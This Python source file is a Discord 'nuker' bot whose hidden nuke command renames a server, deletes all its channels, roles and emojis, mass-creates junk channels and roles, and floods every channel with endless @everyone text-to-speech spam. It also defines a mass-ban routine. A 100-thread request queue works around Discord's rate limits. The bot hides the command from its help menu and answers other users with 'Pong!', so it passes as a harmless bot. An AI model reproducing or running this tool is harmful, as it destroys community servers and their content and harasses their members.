import discord, sys, requests, os, time, asyncio, threading, requests, json
from discord.ext import commands
from dotenv import load_dotenv
from pystyle import (Add, Center, Anime, Colors, Colorate, Write, System)
from queue import Queue
from colorama import (init, Fore)

load_dotenv()

__AUTHOR__ = "Ayuly#3851"
__TOKEN__ = os.getenv('TOKEN')
__USER_ID__ = int(os.getenv('USER_ID'))
__PREFIX__ = os.getenv('PREFIX')
__VERSION__ = os.getenv('VERSION')
__ALIASES_NUKE__ = os.getenv('ALIASES_NUKE')
__STATUS__ = os.getenv('STATUS')
__INVITE_LINK__ = ""
__SERVER_NAME__ = "☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️"
__WEBHOOK_NAME__ = "𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆"
__CHANNEL_NAME__ = "☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️"
__MESSAGE__ = "```☢️ 𝗡𝘂𝗸𝗲𝗱 𝗯𝘆 𝗔𝘆𝘂𝗹𝘆 ☢️```"
__ROLE_NAME__ = "Nuker BY AYULY"
__BAN_REASON__ = "NUKED BY AYULY"
__BANNER__ = r"""

 ________       ___  ___      ___  __        _______       ________          ________     
|\   ___  \    |\  \|\  \    |\  \|\  \     |\  ___ \     |\   __  \        |\_____  \    
\ \  \\ \  \   \ \  \\\  \   \ \  \/  /|_   \ \   __/|    \ \  \|\  \        \|___/  /|   
 \ \  \\ \  \   \ \  \\\  \   \ \   ___  \   \ \  \_|/__   \ \   _  _\           /  / /   
  \ \  \\ \  \   \ \  \\\  \   \ \  \\ \  \   \ \  \_|\ \   \ \  \\  \|         /  /_/__  
   \ \__\\ \__\   \ \_______\   \ \__\\ \__\   \ \_______\   \ \__\\ _\        |\________\
    \|__| \|__|    \|_______|    \|__| \|__|    \|_______|    \|__|\|__|        \|_______|

                                                                             """+"\x1B[38;2;255;161;0mAuthor: " + __AUTHOR__ + """             
                                                                             """+"\x1B[38;2;168;255;0mVersion: v" + __VERSION__

client = commands.Bot(command_prefix=__PREFIX__, intents = discord.Intents.all(), help_command=None)

class Help(commands.HelpCommand):
	def get_command_signature(self, command):
		return '%s%s %s' % (self.context.clean_prefix, command.qualified_name, command.signature)

	async def send_bot_help(self, mapping):
		embed = discord.Embed(title="Help", color=discord.Color.blurple())
		command_signatures = []

		for cog, commands in mapping.items():
			filtered = await self.filter_commands(commands, sort=True)
			for c in filtered:
				if str(c) != 'nuke':
					command_signatures.append(self.get_command_signature(c))

			if command_signatures:
				cog_name = getattr(cog, "qualified_name", "No Category")
				embed.add_field(name=cog_name, value="\n".join(command_signatures), inline=False)

		channel = self.get_destination()
		await channel.send(embed=embed)
client.help_command  = Help()

global requesting, url, headers, payload
timeout = 6
requesting = url = headers = payload = ""
headers = {'authorization': "Bot " + __TOKEN__, 'content-type': 'application/json'}

concurrent = 100
q = Queue(concurrent * 2)
def requestMaker():
	while True:
		requesting, url, headers, payload = q.get()
		try:
			r = requesting(url, data=json.dumps(payload), headers=headers, timeout=timeout)
			if r.status_code == 429:
				r = r.json()
				if True:
					if isinstance(r['retry_after'], int): # Discord will return all integer time if the retry after is less then 10 seconds which is in miliseconds.
						r['retry_after'] /= 1000
					if r['retry_after'] > 5:
						consoleLog(f'Rate limiting has been reached, and this request has been cancelled due to retry-after time is greater than 5 seconds: Wait {str(r["retry_after"])} more seconds.')
						q.task_done()
						continue
					consoleLog(f'Rate limiting has been reached: Wait {str(r["retry_after"])} more seconds.')
				q.put((requesting, url, headers, payload))
		except json.decoder.JSONDecodeError:
			pass
		except requests.exceptions.ConnectTimeout:
			consoleLog(f'Reached maximum load time: timeout is {timeout} seconds long {proxy}')
			q.put((requesting, url, headers, payload))
		except Exception as e:
			consoleLog(f'Unexpected error: {str(e)}')

		q.task_done()

for i in range(concurrent):
	threading.Thread(target=requestMaker, daemon=True).start()

def GetStatus(status):
	if status == 'online':
		return discord.Status.online
	elif status == 'idle':
		return discord.Status.idle
	elif status == "do_not_disturb":
		return discord.Status.do_not_disturb
	elif status == 'invisible':
		return discord.Status.invisible
	else:
		return discord.Status.invisible

@client.event
async def on_ready():
	global __INVITE_LINK__
	if sys.platform == 'linux':
		os.system('clear')
	else:
		os.system('cls')
	__INVITE_LINK__ = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
	await client.change_presence(status = GetStatus(__STATUS__), activity=discord.Game(name= f"{__PREFIX__}{__ALIASES_NUKE__}"))
	__PANEL_INFO__ = f"""
─────────────────────────────────────────────────────────────
	+ NameTag:	\x1b[34m{client.user}\x1B[37m
	+ Command:	\x1B[38;2;0;255;118m{__PREFIX__}nuke\x1B[37m
	+ Aliases:	\x1B[38;2;136;255;0m{__PREFIX__}{__ALIASES_NUKE__}\x1B[37m
	+ Token:	\x1B[33m{__TOKEN__}\x1B[37m
	+ UserID:	\x1B[38;2;255;129;0m{__USER_ID__}\x1B[37m
	+ Prefix:	\x1B[38;2;136;255;0m{__PREFIX__}\x1B[37m
	+ Invite Link:	\x1B[38;2;66;149;217m{__INVITE_LINK__}\x1B[37m
	+ Status:	\x1B[38;2;0;255;146m{__STATUS__}\x1B[37m
─────────────────────────────────────────────────────────────

	"""
	print("\x1B[38;2;41;128;185m"+__BANNER__+"\x1B[37m")
	print(__PANEL_INFO__)

def consoleLog(message, print_success=True, print_time=True):
	if True:
		TIME = ''
		if print_time:
			TIME = f'[{time.strftime("%H:%M:%S", time.localtime())}] '
			TIME = Fore.GREEN + TIME
		if print_success:
			try:
				print(f'{TIME}{Fore.GREEN}{message}')
			except TypeError:
				sys.stdout.buffer.write(f'{TIME}{Colorate.Horizontal(Colors.yellow_to_red, message)}'.encode('utf8'))
		else:
			try:
				print(f'{TIME}{Fore.RED}{message}')
			except TypeError:
				sys.stdout.buffer.write(f'{TIME}{Fore.RED}{message}'.encode('utf8'))

#	::: NUKE :::	#

async def CreateChannels(ctx, n, name):
	name = __CHANNEL_NAME__ if name is None else name
	payload = {
		'type': 0,
		'name': name,
		'permission_overwrites': []
	}
	for i in range(n):
		try:
			q.put((requests.post, f'https://discord.com/api/v8/guilds/{ctx.guild.id}/channels', headers, payload))
			consoleLog(f"[ChannelsCreate] Successfully Made Channel {name}!", True)
		except:
			consoleLog(f"[ChannelsCreate] Unable To Create Channel!", False)
	q.join()

async def DeleteChannels(Channels):
	for Channel in Channels:
		q.put((requests.delete, f'https://discord.com/api/v8/channels/{Channel.id}', headers, None))
		consoleLog(f"[ChannelsDelete] {Channel.name} Has Been Successfully Deleted!")
	q.join()

async def DeleteRoles(ctx):
	for role in ctx.guild.roles:
		try:
			q.put((requests.delete, f'https://discord.com/api/v10/guilds/{ctx.guild.id}/roles/{role.id}', headers, None))
			consoleLog(f"[RolesDelete] Role {role.name} Has Been Successfully Deleted!")
		except:
			consoleLog(f"[RolesDelete] Role {role.name} Unble To Deleted!", False)
	q.join()

async def CreateRole(ctx, n, name):
	name = __ROLE_NAME__ if name is None else name
	payload = {
		'name': name
	}
	for i in range(n):
		try:
			q.put((requests.post, f'https://discord.com/api/v10/guilds/{ctx.guild.id}/roles', headers, payload))
			consoleLog(f"[RolesCreate] Successfully Created Role {name} In {ctx.guild.name}!")
		except:
			consoleLog(f"[RolesCreate] Unable To Create Roles {name} In {ctx.guild.name}!", False)
	q.join()

async def DeleteEmoji(ctx):
	for emoji in ctx.guild.emojis:
		try:
			q.put((requests.delete, f'https://discord.com/api/v8/guilds/{ctx.guild.id}/emojis/{emoji.id}', headers, None))
			consoleLog(f"[EmojisDelete] Successfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
		except:
			consoleLog(f"[EmojisDelete] Unable To Delete Emoji {emoji.name} In {ctx.guild.name}!", False)
	q.join()

async def BanAll(ctx):
	payload = {'delete_message_days':'0', 'reason': __BAN_REASON__}
	for member in ctx.guild.members:
		if member.id != __USER_ID__ or member != client.user:  
			try:
				q.put((requests.put, f'https://discord.com/api/v8/guilds/{ctx.guild.id}/bans/{member.id}', headers, payload))
				consoleLog(f"[Ban] {member.name} Has Been Successfully Banned In {ctx.guild.name}")
			except:
				consoleLog(f"[Ban] Unable To Ban {member.name} In {ctx.guild.name}!", False)
	q.join()

async def SendMessage(ctx = None, _channel = None):
	global __INVITE_LINK__
	msg = __MESSAGE__
	payload = {
		"content": "@everyone",
		"tts": True,
		"embeds": [{
			"title": msg,
			"color": 34047,
			"description": f"\n INVITE: {__INVITE_LINK__}",
			"footer": {
				"text": msg
			},
		}]
	}
	while True:
		if _channel == None and ctx != None:
			for channel in ctx.guild.channels:
				try:
					q.put((requests.post, f'https://discord.com/api/v8/channels/{channel.id}/messages', headers, payload))
					consoleLog(f"[MessageSend] Send {msg} Message!")
				except:
					consoleLog(f"[MessageSend] Unble to send {msg} Message!", False)
		else:
			try:
				q.put((requests.post, f'https://discord.com/api/v8/channels/{_channel.id}/messages', headers, payload))
				consoleLog(f"[MessageSend] Send {msg} Message!")
			except:
				consoleLog(f"[MessageSend] Unble to send {msg} Message!", False)
	q.join()

@client.command(aliases=[__ALIASES_NUKE__])
async def nuke(ctx, amount = 50, *, name = None):
	if ctx.message.author.id == __USER_ID__:
		await ctx.message.delete()
		await ctx.guild.edit(name = __SERVER_NAME__)
		channels = ctx.guild.channels
		tasksDelete = [await DeleteChannels(channels), await DeleteRoles(ctx), await DeleteEmoji(ctx),]
		tasksCreate = [await CreateChannels(ctx, amount, name), await CreateRole(ctx, amount, name),]
		await asyncio.sleep(2)
		await SendMessage(ctx,)
		await asyncio.gather(*tasksDelete)
		await asyncio.gather(*tasksCreate)
	else:
		await ctx.send("Pong!")

@client.event
async def on_command_error(ctx, error):
	if isinstance(error, commands.MissingRequiredArgument):
		await ctx.send('Please pass in all requirements :rolling_eyes:.')
	if isinstance(error, commands.MissingPermissions):
		await ctx.send("You dont have the permissions :angry:")

@client.command(aliases=["delC"])
async def delChannels(ctx):
	for channel in ctx.guild.channels:
		try:
			q.put((requests.delete, f'https://discord.com/api/v8/channels/{channel.id}', headers, None))
			consoleLog(f"[ChannelsDelete] {channel.name} Has Been Successfully Deleted!")
		except:
			consoleLog(f"[ChannelsDelete] {channel.name} Unble to Deleted!", False)
			continue
	q.join()

@client.command(aliases=['cs'])
async def changesStatus(ctx, status):
	if ctx.message.author.id == __USER_ID__:
		await client.change_presence(status = GetStatus(status), activity=discord.Game(name= f"{__PREFIX__}{__ALIASES_NUKE__}"))
		consoleLog(f"[StatusChannge] Change Status to {status}")
	else:
		ctx.send(f'{ctx.message.author.name} You are not the owner of me!')


#		::: NORMAL COMMANDS :::		#

# make your own

client.run(__TOKEN__)